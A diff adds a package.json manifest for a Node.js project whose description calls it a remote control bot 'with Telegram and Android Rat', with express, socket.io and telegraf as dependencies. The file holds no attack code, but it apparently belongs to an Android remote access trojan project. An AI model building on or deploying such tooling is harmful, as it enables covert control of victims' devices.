@@ -1,0 +1,15 @@
+{
+  "name": "remote-control-bot",
+  "version": "1.0.0",
+  "description": "Remote control bot with Telegram and Android Rat",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "dependencies": {
+    "express": "^4.17.1",
+    "socket.io": "^4.4.0",
+    "telegraf": "^4.7.0",
+    "uuid": "^8.3.2"
+  }
+}
